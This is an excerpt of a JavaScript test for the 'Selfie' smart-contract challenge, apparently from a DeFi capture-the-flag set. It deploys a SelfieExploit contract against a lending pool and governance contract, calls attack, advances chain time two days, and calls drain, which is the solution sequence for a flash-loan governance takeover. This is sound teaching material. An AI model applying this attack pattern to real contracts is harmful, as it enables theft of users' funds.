...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const ExploitFactory = await ethers.getContractFactory("SelfieExploit");
        this.exploit = await ExploitFactory.deploy(this.pool.address, this.governance.address, attacker.address);
        await this.exploit.attack(this.token.balanceOf(this.pool.address));
        // Advance time 2 days so that governance action can be executed
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
        await this.exploit.drain();
    });
